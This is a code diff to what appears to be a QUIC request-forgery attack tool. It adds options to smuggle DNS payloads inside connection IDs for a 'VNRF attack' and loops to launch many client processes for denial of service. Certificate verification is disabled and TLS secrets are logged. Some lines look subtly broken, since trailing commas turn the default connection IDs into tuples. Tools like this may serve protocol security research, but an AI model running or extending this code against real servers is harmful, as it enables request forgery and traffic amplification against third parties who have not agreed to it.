@@ -29,6 +29,7 @@ from aioquic.tls import CipherSuite, SessionTicket
 from aioquic.quic.packet import QuicProtocolVersion
 
 import minimal_http_client as cl
+import vnrf_payload_dns as vp_dns
 
 
 banner = '''
@@ -79,20 +80,22 @@ def parse_arguments():
     parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
     parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
     parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
-
     parser_cm._optionals.title = 'Optional Arguments'
     parser_cm._positionals.title = 'Required Arguments'
 
-
-
     #Parser for VNRF
     parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
+    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)
+    parser_vn.add_argument('--payload_mode','-M', help='The payload type that is sent with VNRF', default=None, choices=['dns'])
+    parser_vn.add_argument('--payload','-P', help='The payload for a VNRF attack. Only works with payload_mode', default="")
     parser_vn._optionals.title = 'Optional Arguments'
     parser_vn._positionals.title = 'Required Arguments'
-    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)
 
     #Parser for SIRF
     parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
+    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
+    parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
+    parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
     parser_si._optionals.title = 'Optional Arguments'
     parser_si._positionals.title = 'Required Arguments'
 
@@ -168,6 +171,12 @@ def configure_client(args):
     version = 'VNRF' if args.mode == "vn" else "VERSION_1"
     cid_len = args.cid_len if "cid_len" in args else 20
 
+    init_dcid = b"A" * cid_len,
+    init_scid = b"B" * cid_len,
+    if args.mode == 'vn' and args.payload_mode != None:
+        if args.payload_mode == "dns":
+            init_dcid, init_scid = vp_dns.create_payload(args.payload)
+
     configuration = QuicConfiguration(
         is_client=True, 
         supported_versions =  [QuicProtocolVersion[version].value],
@@ -175,6 +184,8 @@ def configure_client(args):
         verify_mode = ssl.CERT_NONE,
         secrets_log_file = open("secrets/secrets.log","w"),
         connection_id_length = cid_len,
+        init_dcid = init_dcid,
+        init_scid = init_scid,
     )
     
     return url, configuration
@@ -221,12 +232,12 @@ def main():
 
         print("[+] Starting client")
         processes = []
-        if args.mode == 'cm' and args.legacy:
-            print("[!] legacy mode")
+        if args.mode in ('cm','si') and args.legacy:
+            print("[!] Legacy Mode")
             cmd = configure_legacy_client(args)
-            print(cmd)
-            p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            processes.append(p)
+            for i in range(1,args.dos+1):
+                p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                processes.append(p)
         else:
             url, configuration = configure_client(args)
             for i in range(1,args.dos+1):
